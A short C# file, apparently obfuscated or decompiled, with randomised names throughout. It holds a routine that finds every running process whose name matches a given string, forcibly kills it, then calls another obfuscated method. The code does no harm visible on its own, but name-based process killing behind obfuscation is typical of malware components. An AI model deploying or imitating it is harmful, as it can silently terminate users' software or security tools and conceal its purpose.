using System;
using System.Diagnostics;

namespace HuHbCLeSgdQqCa;

public sealed class hmhRDSTVOyXAIfL
{
	public static bool uthbylWlQPxML(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void udpinnipUOIN(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (uthbylWlQPxML(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					sjdJQieILoWa.pkRYqBCsNjQnL();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
